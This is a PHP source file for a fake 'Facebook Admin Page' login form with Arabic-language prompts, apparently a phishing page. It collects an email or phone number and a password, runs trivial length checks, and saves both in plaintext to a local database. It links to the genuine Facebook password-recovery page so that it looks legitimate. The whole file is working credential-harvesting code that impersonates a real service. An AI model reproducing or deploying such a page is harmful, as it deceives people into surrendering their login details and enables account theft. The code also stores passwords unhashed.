<?php
  ob_start();
  session_start();

  if (isset($_SESSION) && !empty($_SESSION)){
    header('location: logout.php');
    exit();
  }
  include 'connect.php';
  include 'includes/templates/header.php';
  include 'includes/templates/nav.php';

  if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    if (!isset($_POST['email']) || !isset($_POST['pass'])) {
      header('location: index.php');
      exit();
    }
    $username = filter_var($_POST['email'],FILTER_SANITIZE_STRING);
    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_STRING);
    if (empty($username)) {
      $errors[] = "<div class='alert alert-danger l-captial' dir='rtl'> البريد الالكتروني <strong>خاطئ</strong></div>";
    }
    if (empty($pass)) {
      $errors[] = "<div class='alert alert-danger l-captial' dir='rtl'>كلمة المرور <strong>خاطئه</strong></div>";
    }
    if (!empty($username) && strlen($username) < 9){
      $errors[] = "<div class='alert alert-danger l-captial' dir='rtl'> البريد الالكتروني <strong>خاطئ</strong></div>";
    }
    if (!empty($pass) && strlen($pass) < 7){
      $errors[] = "<div class='alert alert-danger l-captial' dir='rtl'>كلمة المرور <strong>خاطئه</strong></div>";
    }
    if (empty($errors)) {
      $stmt = $con->prepare("INSERT INTO users(email_phone, password) VALUES(:user, :pass)");
      $stmt->execute([
        'user' => $username,
        'pass' => $pass
      ]);
      header('location: getuser.php');
      $_SESSION['user'] = 'user';
    }
  } ?>
  <div class="bg-ahe pt-5">
    <div class="container">
      <h2 class="text-center l-capital mb-3">Facebook Admin Page</h2>
      <div class="row">
        <div class="bg-face mb-5">
          <h4 class='text-center mb-5'>الرجاء ادخال البريد الالكتروني و كلمه المرور الخاصه بك</h4>
          <form class="form-group col-12 col-sm-12 col-md-8 col-lg-9 m-auto" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
            <div class="form-row mb-3">
              <input type="text" name="email" class="form-control col-12" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
            </div>
            <div class="form-row mb-3">
              <input type="password" name="pass" class="form-control col-12" placeholder="كلمة السر">
            </div>
            <div class="form-row">
              <input type="submit" value="تسجيل الدخول" class="col-12 text-center btn face-btn">
            </div>
            <div class="col-12">
              <a class="text-center d-block" href="https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar">هل نسيت كلمه المرور؟</a>
            </div>
          </form>
          <div class="errors mt-5" dir="rtl">
  <?php
            if (isset($errors) && !empty($errors)){
              foreach ($errors as $error) {
                echo $error;
              }
            } ?>
          </div>
        </div>
      </div>
    </div>
  </div>
  <?php
    include 'includes/templates/footer.php';
    ob_end_flush(); ?>
